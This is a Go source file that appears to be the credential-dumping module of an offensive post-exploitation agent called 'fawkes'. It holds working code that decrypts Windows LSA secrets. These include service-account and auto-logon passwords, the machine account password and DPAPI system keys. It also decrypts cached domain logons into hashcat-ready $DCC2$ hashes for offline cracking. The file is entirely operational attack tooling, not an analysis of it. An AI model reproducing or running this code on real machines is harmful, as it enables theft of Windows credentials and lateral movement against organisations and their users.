package commands

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strings"
	"unicode/utf16"

	"fawkes/pkg/structs"
)

// lsaCachedCred holds parsed cached domain credential information.
type lsaCachedCred struct {
	username string
	domain   string
	hash     string
	hashcat  string
}

// lsaSHA256Rounds derives a key by SHA256-hashing key+data for N rounds (single context).
func lsaSHA256Rounds(key, data []byte, rounds int) []byte {
	h := sha256.New()
	for i := 0; i < rounds; i++ {
		h.Write(key)
		h.Write(data)
	}
	return h.Sum(nil)
}

// lsaAESDecryptECB decrypts using AES-256-ECB (CBC with zero IV per block).
func lsaAESDecryptECB(key, data []byte) ([]byte, error) {
	if len(key) != 32 {
		return nil, fmt.Errorf("key must be 32 bytes, got %d", len(key))
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	plaintext := make([]byte, 0, len(data))
	zeroIV := make([]byte, aes.BlockSize)

	for i := 0; i < len(data); i += aes.BlockSize {
		end := i + aes.BlockSize
		if end > len(data) {
			// Partial block — pad with zeros
			padded := make([]byte, aes.BlockSize)
			copy(padded, data[i:])
			mode := cipher.NewCBCDecrypter(block, zeroIV)
			out := make([]byte, aes.BlockSize)
			mode.CryptBlocks(out, padded)
			plaintext = append(plaintext, out[:len(data)-i]...)
		} else {
			mode := cipher.NewCBCDecrypter(block, zeroIV)
			out := make([]byte, aes.BlockSize)
			mode.CryptBlocks(out, data[i:end])
			plaintext = append(plaintext, out...)
		}
	}

	return plaintext, nil
}

// lsaDecryptSecret decrypts a single LSA secret value.
// Input is the raw binary from SECURITY\Policy\Secrets\<name>\CurrVal.
// LSA_SECRET: version(4) + keyID(16) + algo(4) + flags(4) + encData(rest)
func lsaDecryptSecret(data, lsaKey []byte) ([]byte, error) {
	if len(data) < 28+32 {
		return nil, fmt.Errorf("secret data too short (%d bytes)", len(data))
	}

	encData := data[28:]

	// Derive AES key
	tmpKey := lsaSHA256Rounds(lsaKey, encData[:32], 1000)

	// AES-256-ECB decrypt
	plaintext, err := lsaAESDecryptECB(tmpKey, encData[32:])
	if err != nil {
		return nil, err
	}

	// LSA_SECRET_BLOB: length(4) + unknown(12) + secret(rest)
	if len(plaintext) < 16 {
		structs.ZeroBytes(plaintext)
		return nil, fmt.Errorf("decrypted blob too short")
	}

	secretLen := binary.LittleEndian.Uint32(plaintext[0:4])
	secret := make([]byte, len(plaintext[16:]))
	copy(secret, plaintext[16:])
	if secretLen > 0 && int(secretLen) < len(secret) {
		secret = secret[:secretLen]
	}
	structs.ZeroBytes(plaintext)

	return secret, nil
}

// lsaFormatSecret formats a decrypted LSA secret for display.
func lsaFormatSecret(name string, secret []byte) string {
	if len(secret) == 0 {
		return "    (empty)\n"
	}

	var sb strings.Builder

	switch {
	case strings.HasPrefix(name, "_SC_"):
		// Service account password (UTF-16LE, often null-terminated)
		password := lsaUTF16ToString(secret)
		sb.WriteString(fmt.Sprintf("    Service: %s\n", strings.TrimPrefix(name, "_SC_")))
		sb.WriteString(fmt.Sprintf("    Password: %s\n", password))

	case name == "$MACHINE.ACC":
		// Machine account password (raw UTF-16LE, typically 120+ bytes of random chars)
		sb.WriteString(fmt.Sprintf("    Machine Account Password (%d bytes)\n", len(secret)))
		sb.WriteString(fmt.Sprintf("    Hex: %s\n", hex.EncodeToString(secret)))

	case name == "DPAPI_SYSTEM":
		// DPAPI system backup keys: version(4) + userKey(20) + machineKey(20)
		if len(secret) >= 44 {
			userKey := secret[4:24]
			machineKey := secret[24:44]
			sb.WriteString(fmt.Sprintf("    DPAPI User Key:    %s\n", hex.EncodeToString(userKey)))
			sb.WriteString(fmt.Sprintf("    DPAPI Machine Key: %s\n", hex.EncodeToString(machineKey)))
		} else {
			sb.WriteString(fmt.Sprintf("    Raw (%d bytes): %s\n", len(secret), hex.EncodeToString(secret)))
		}

	case name == "NL$KM":
		// Cached credential encryption key
		sb.WriteString(fmt.Sprintf("    Cache Encryption Key (%d bytes)\n", len(secret)))
		sb.WriteString(fmt.Sprintf("    Hex: %s\n", hex.EncodeToString(secret)))

	case name == "DefaultPassword":
		// Auto-logon password (UTF-16LE)
		password := lsaUTF16ToString(secret)
		sb.WriteString(fmt.Sprintf("    Auto-Logon Password: %s\n", password))

	default:
		sb.WriteString(fmt.Sprintf("    Raw (%d bytes): %s\n", len(secret), hex.EncodeToString(secret)))
		printable := lsaExtractPrintable(secret)
		if printable != "" {
			sb.WriteString(fmt.Sprintf("    Printable: %s\n", printable))
		}
	}

	return sb.String()
}

// lsaUTF16ToString converts UTF-16LE bytes to string, stopping at null.
func lsaUTF16ToString(b []byte) string {
	if len(b) < 2 {
		return ""
	}
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	u16 := make([]uint16, len(b)/2)
	for i := range u16 {
		u16[i] = binary.LittleEndian.Uint16(b[i*2 : i*2+2])
	}
	for i, c := range u16 {
		if c == 0 {
			u16 = u16[:i]
			break
		}
	}
	return string(utf16.Decode(u16))
}

// lsaExtractPrintable extracts printable ASCII from binary data.
// Returns empty string if fewer than 4 printable characters found.
func lsaExtractPrintable(data []byte) string {
	var sb strings.Builder
	for _, b := range data {
		if b >= 0x20 && b < 0x7F {
			sb.WriteByte(b)
		}
	}
	if sb.Len() < 4 {
		return ""
	}
	return sb.String()
}

// lsaParseCachedCred parses and decrypts a single NL$ cache entry.
//
// NL_RECORD (100 bytes):
//
//	userNameLen(2) + domainNameLen(2) + effectiveNameLen(2) + fullNameLen(2) +
//	logonScriptLen(2) + profilePathLen(2) + homeDirLen(2) + homeDriveLen(2) +
//	userID(4) + primaryGroupID(4) + groupCount(4) + logonDomainNameLen(2) +
//	pad(2) + lastAccess(8) + revision(4) + sidCount(4) + valid(4) +
//	iterationCount(4) + sifLength(4) + logonPackage(4) +
//	dnsDomainNameLen(2) + upnLen(2) + IV(16) + CH(16)
//
// Followed by encrypted data containing:
//
//	MSCacheV2Hash(16) + username(UTF-16) + pad4 + domain(UTF-16) + ...
func lsaParseCachedCred(data, nlkm []byte, globalIterCount uint32) (*lsaCachedCred, error) {
	if len(data) < 100 {
		return nil, fmt.Errorf("data too short for NL_RECORD (%d bytes)", len(data))
	}

	userNameLen := binary.LittleEndian.Uint16(data[0:2])
	domainNameLen := binary.LittleEndian.Uint16(data[2:4])

	if userNameLen == 0 {
		return nil, nil // Empty cache slot
	}

	valid := binary.LittleEndian.Uint32(data[48:52])
	if valid == 0 {
		return nil, nil // Unused entry
	}

	entryIterCount := binary.LittleEndian.Uint32(data[52:56])
	iterCount := globalIterCount
	if entryIterCount > 0 {
		iterCount = entryIterCount
	}

	iv := data[68:84]
	encryptedData := data[100:]

	if len(encryptedData) < 16+int(userNameLen) {
		return nil, fmt.Errorf("encrypted data too short")
	}

	// Decrypt using AES-128-CBC with NL$KM[16:32] as key
	cacheKey := nlkm[16:32]

	// Pad to block size
	encLen := len(encryptedData)
	if encLen%aes.BlockSize != 0 {
		padded := make([]byte, ((encLen+aes.BlockSize-1)/aes.BlockSize)*aes.BlockSize)
		copy(padded, encryptedData)
		encryptedData = padded
	}

	block, err := aes.NewCipher(cacheKey)
	if err != nil {
		return nil, fmt.Errorf("AES init: %v", err)
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(encryptedData))
	mode.CryptBlocks(plaintext, encryptedData)
	defer structs.ZeroBytes(plaintext)

	// Decrypted layout:
	// MSCacheV2Hash(16) + username(userNameLen) + pad4 + domain(domainNameLen) + ...
	dcc2Hash := plaintext[:16]

	// Extract username
	offset := 16
	username := ""
	if int(userNameLen) > 0 && offset+int(userNameLen) <= len(plaintext) {
		username = lsaUTF16ToString(plaintext[offset : offset+int(userNameLen)])
	}

	// Extract domain (aligned to 4-byte boundary after username)
	offset += int(userNameLen)
	offset = (offset + 3) & ^3 // Align to 4 bytes
	domain := ""
	if int(domainNameLen) > 0 && offset+int(domainNameLen) <= len(plaintext) {
		domain = lsaUTF16ToString(plaintext[offset : offset+int(domainNameLen)])
	}

	hashHex := hex.EncodeToString(dcc2Hash)

	// Hashcat DCC2 format: $DCC2$<iterations>#<username>#<hash>
	hashcatFmt := fmt.Sprintf("$DCC2$%d#%s#%s", iterCount, strings.ToLower(username), hashHex)

	return &lsaCachedCred{
		username: username,
		domain:   domain,
		hash:     hashHex,
		hashcat:  hashcatFmt,
	}, nil
}
